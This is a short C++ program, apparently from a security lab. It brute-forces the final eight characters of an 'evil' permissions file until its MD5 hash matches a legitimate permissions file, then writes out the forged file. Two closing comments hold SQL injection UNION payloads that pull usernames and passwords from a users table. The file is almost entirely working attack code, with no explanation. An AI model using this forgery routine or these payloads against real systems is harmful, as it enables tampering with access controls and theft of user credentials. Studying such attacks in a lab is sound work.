#include <iostream>
#include <openssl/md5.h>
#include <string>
#include <cstring>
#include <fstream>
#include <sstream>
#include <string>

using namespace std;

string permissions_hash;
int N;

string readFileToString(const string filename)
{
        ifstream file(filename);
        stringstream buffer;

        if (file.is_open())
        {
                buffer << file.rdbuf();
                file.close();
                return buffer.str();
        }
        else
        {
                throw runtime_error("Unable to open the file.");
        }
}

string calculateMD5(const string &input)
{
        unsigned char digest[MD5_DIGEST_LENGTH];
        MD5(reinterpret_cast<const unsigned char *>(input.c_str()), input.length(), digest);

        char md5String[MD5_DIGEST_LENGTH * 2 + 1];
        for (int i = 0; i < MD5_DIGEST_LENGTH; i++)
        {
                sprintf(&md5String[i * 2], "%02x", (unsigned int)digest[i]);
        }

        return md5String;
}

bool recursion(string &text, int index)
{
        if (calculateMD5(text) == permissions_hash)
        {
                ofstream file("evil-permission-modified.txt");
                file << text;
                file.close();
                cout << text << endl;
                return true;
        }

        if (index == N)
                return false;

        for (int i = 0; i < 26; i++)
        {
                text[index] = 'a' + i;
                if(recursion(text, index + 1))
                        return true;
        }
        return false;
}
int main()
{
        string text = readFileToString("permissions.txt");
        permissions_hash = calculateMD5(text);

        string evil_text = readFileToString("evil-permissions.txt");
        N = evil_text.size();
        recursion(evil_text,N-8);
        
        return 0;
}


// ' or 1=1  UNION SELECT username,password,NULL,NULL from users -- 
// Rajesh'  UNION SELECT CONCAT(username," ",password),CONCAT(username," ",password),NULL,NULL from users -- 